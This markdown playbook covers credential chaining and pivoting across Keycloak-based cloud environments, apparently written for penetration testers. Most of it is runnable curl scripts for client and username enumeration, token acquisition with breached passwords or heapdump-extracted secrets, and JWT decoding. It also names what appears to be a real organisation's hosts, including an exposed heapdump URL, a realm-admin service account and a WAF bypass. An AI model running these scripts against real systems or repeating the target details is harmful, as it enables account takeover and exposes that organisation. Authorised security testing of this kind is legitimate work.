# Credential Chaining & Cross-Environment Pivoting

## Overview

Modern cloud-native applications (GKE, EKS, AKS) share credentials across environments more often than expected. A single credential from a low-security environment can cascade into full production compromise.

## Attack Flow

```
Heapdump (mock/dev) → Service Account Token → SIT Keycloak → Realm Admin
    ↓
Snyk Token (CI/CD) → Full Vulnerability Database → Targeted Exploitation
    ↓
CTI Credentials (breach DB) → Prod Keycloak (if no MFA) → All Microservices
    ↓
GitHub Actions SA → CI/CD Pipeline → Deploy Malicious Code
```

## Credential Sources (Priority Order)

| Source | Likelihood | Extraction Difficulty | Typical Yield |
|--------|-----------|----------------------|---------------|
| Spring Boot Heapdump | High (if actuator exposed) | Medium (Eclipse MAT needed for full extraction) | DB passwords, API keys, service tokens, Keycloak secrets |
| JavaScript Bundles | Medium | Low (regex scan) | API keys, Firebase configs, internal URLs |
| Snyk/SonarQube Tokens | Medium (CI/CD leak) | Low (if found in heapdump/JS) | Full vulnerability database, repo enumeration |
| CTI/Breach Databases | Variable | N/A (external source) | User passwords (often reused) |
| GitHub Actions Secrets | High (if SA token found) | Medium (need to trigger workflow) | All repo secrets, deploy keys |
| Kubernetes Secrets | High (if pod access) | Low (base64 decode) | All service credentials |

## Keycloak Credential Chaining

### Step 1: Discover Keycloak Endpoint

```bash
# Direct access
curl -sk "https://keycloak.domain.com/auth/realms/master/.well-known/openid-configuration"

# Proxied through gateway (common in GKE/Istio)
curl -sk "https://microservices.domain.com/keycloak/realms/{realm}/.well-known/openid-configuration"

# Check for 405 (endpoint exists, wrong method)
curl -sk -o /dev/null -w "%{http_code}" "https://gateway.domain.com/keycloak/realms/bravo/protocol/openid-connect/token"
```

### Step 2: Enumerate Clients

```bash
# Public clients return different error than non-existent ones
for client in admin-cli account {app-name} {app-name}-api {app-name}-web; do
  resp=$(curl -sk -X POST "$TOKEN_URL" \
    -d "grant_type=client_credentials&client_id=$client&client_secret=test")
  echo "$client: $(echo $resp | jq -r '.error_description')"
done

# Interpretation:
# "Public client not allowed to retrieve service account" = VALID public client
# "Invalid client or Invalid client credentials" = doesn't exist OR confidential client
# "unauthorized_client" = client exists but grant type not allowed
```

### Step 3: Username Enumeration

```bash
# Password grant with known public client reveals valid usernames
for user in "firstname.lastname" "employee_id" "email@domain.com"; do
  resp=$(curl -sk -X POST "$TOKEN_URL" \
    -d "grant_type=password&client_id=admin-cli&username=$user&password=invalid")
  desc=$(echo $resp | jq -r '.error_description')
  echo "$user: $desc"
done

# "Invalid user credentials" = USER EXISTS (password wrong)
# "Account not found" or "Invalid user" = user doesn't exist
# "Account disabled" = user exists but disabled
# "Account locked" = user exists, too many attempts
```

### Step 4: Token Acquisition

```bash
# With compromised password (CTI/breach source)
curl -sk -X POST "$TOKEN_URL" \
  -d "grant_type=password&client_id=admin-cli&username=$USER&password=$PASS"

# With service account client secret (from heapdump)
curl -sk -X POST "$TOKEN_URL" \
  -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$SECRET"

# Token exchange (if enabled — usually disabled)
curl -sk -X POST "$TOKEN_URL" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$TOKEN&client_id=$CLIENT"
```

### Step 5: JWT Analysis

```bash
# Decode JWT payload (middle segment)
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Key fields to examine:
# - realm_access.roles: what roles the token has
# - resource_access: per-client role mappings
# - scope: granted scopes
# - aud: audience (which services accept this token)
# - azp: authorized party (which client issued this)
# - sub: subject (user ID)
# - preferred_username: human-readable username
```

## Cross-Environment Pivot Matrix

| From | To | Pivot Method | Success Rate |
|------|----|-------------|-------------|
| Mock heapdump | SIT Keycloak | Service account token reuse | High (same cluster) |
| SIT Keycloak | Prod Keycloak | Same service account credentials | Medium (often rotated) |
| SIT/UAT DB | Prod DB | Same connection string pattern | Low (usually different) |
| GitHub Actions | All environments | SA has deploy access everywhere | High |
| Snyk token | All repos | Org-level token, not per-repo | High |
| Dev JS bundles | Prod APIs | Same API keys across envs | Medium |
| Breach credentials | Prod Keycloak | Password reuse, no MFA | Medium-High |

## Environment Relationship Mapping

When you discover one environment, map the naming pattern to find others:

```
Pattern: {service}.{env}.{project}.{domain}
Example: bravo-bpm.mock.bravo.bfi.co.id

Derived targets:
  bravo-bpm.sit.bravo.bfi.co.id
  bravo-bpm.uat.bravo.bfi.co.id
  bravo-bpm.prod.bravo.bfi.co.id
  microservices.prod.bravo.bfi.co.id (gateway)
```

## Documenting Credential Chains

For the report, document each chain as an attack narrative:

```markdown
### Attack Chain: Mock Heapdump → Production Access

1. **Entry Point:** Unauthenticated heapdump download from mock service
   - URL: https://bravo-bpm.mock.bravo.bfi.co.id/actuator/heapdump
   - No authentication required

2. **Credential Extraction:** Service account token from JVM memory
   - Token: github-actions-sa (realm-admin role)
   - Extracted via: strings + Eclipse MAT

3. **Privilege Level:** Realm administrator on SIT Keycloak
   - Can create/delete users, modify roles, impersonate any user
   - Blocked from external network (SIT Keycloak internal-only)

4. **Lateral Movement:** Same gateway proxies prod Keycloak
   - Token endpoint: https://microservices.prod.bravo.bfi.co.id/keycloak/...
   - Public clients confirmed: admin-cli, account
   - Username enumeration possible

5. **Impact:** With valid prod credentials (CTI source), full microservice access
   - 8 services confirmed behind JWT auth
   - WAF bypass via case variation proven
```

## Pitfalls

- **Don't test CTI credentials without explicit authorization** — may violate local law
- **Rate limiting on Keycloak** — default is 30 failed attempts before lockout
- **Token expiry** — Keycloak access tokens typically expire in 5 minutes; refresh tokens in 30 minutes
- **Audience validation** — a token for one service may not work on another (check `aud` claim)
- **Internal-only Keycloak** — SIT/UAT Keycloak often resolves only from within the cluster; prod may be proxied through gateway
- **MFA on prod** — production Keycloak may enforce MFA even if lower environments don't
- **Account lockout** — document lockout threshold before testing (check Keycloak realm settings if accessible)
